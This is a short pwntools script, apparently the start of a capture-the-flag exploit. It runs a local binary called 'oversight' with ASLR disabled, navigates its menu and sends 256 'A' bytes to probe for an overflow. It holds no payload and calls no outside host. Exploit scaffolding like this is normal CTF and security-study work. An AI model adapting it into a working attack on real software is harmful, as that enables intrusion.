from pwn import *
io = process("./oversight",aslr=False)

pause()
io.recv()
io.sendline()
io.recv()
io.sendline("1")
io.recv()
io.sendline("256")
io.sendline("A"*256)
